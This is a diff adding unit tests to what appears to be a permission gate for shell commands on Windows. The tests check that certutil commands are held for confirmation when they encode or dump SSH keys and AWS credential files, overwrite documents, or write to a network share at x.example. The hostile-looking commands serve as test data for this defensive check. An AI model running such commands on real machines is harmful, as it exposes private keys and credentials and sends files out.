@@ -90,3 +90,25 @@ describe("output that is a secret by where it comes from (commands-remote-r11-4)
     }
   });
 });
+
+describe("Windows certutil's file verbs (commands-remote-c11-1)", () => {
+  const PS = { shell: "powershell" as const, context: "win32" as const };
+  const CMD = { shell: "cmd" as const, context: "win32" as const };
+
+  it("asks before it encodes or dumps a secret, overwrites a file or writes to a share, as copy does", () => {
+    for (const [cmd, rule, o] of [
+      ["certutil -encode ~\\.ssh\\id_rsa out.txt", "path.secret", PS], ["certutil -encodehex ~\\.ssh\\id_rsa out.txt", "path.secret", PS],
+      ["certutil -dump ~\\.ssh\\id_rsa", "path.secret", PS], ["certutil -encode C:\\Users\\ana\\.aws\\credentials o.txt", "path.secret", PS],
+      ["certutil -encode %USERPROFILE%\\.ssh\\id_rsa o.txt", "path.secret", CMD], ["certutil /encode %USERPROFILE%\\.ssh\\id_rsa o.txt", "path.secret", CMD],
+      ["certutil -f -decode in.b64 report.docx", "certutil.output", PS], ["certutil -decodehex in.hex report.docx", "certutil.output", PS],
+      ["certutil -f -decode in.b64 ~\\Documents\\old\\a.docx", "certutil.output", PS], ["certutil -encode report.docx \\\\x.example\\share\\r.txt", "upload.unc", PS],
+      ["certutil -v -encode ~\\.ssh\\id_rsa o.txt", "path.secret", PS], ["certutil -frobnicate x", "unclear.option-value", PS], ["certutil -decode in.b64 /tmp/x", "unclear.option-value", PS],
+    ] as const) {
+      const d = decide(cmd, o);
+      expect(d.verdict, cmd).toBe("ask");
+      expect(d.rules, cmd).toContain(rule);
+    }
+    // Hashing, listing a store and encoding into a new file still run.
+    for (const cmd of ["certutil -hashfile a.zip SHA256", "certutil -store my", "certutil -encode a.txt b.txt"]) expect(decide(cmd, { ...PS, missing: ["C:\\Users\\ana\\proj\\b.txt"] }).verdict, cmd).toBe("run");
+  });
+});
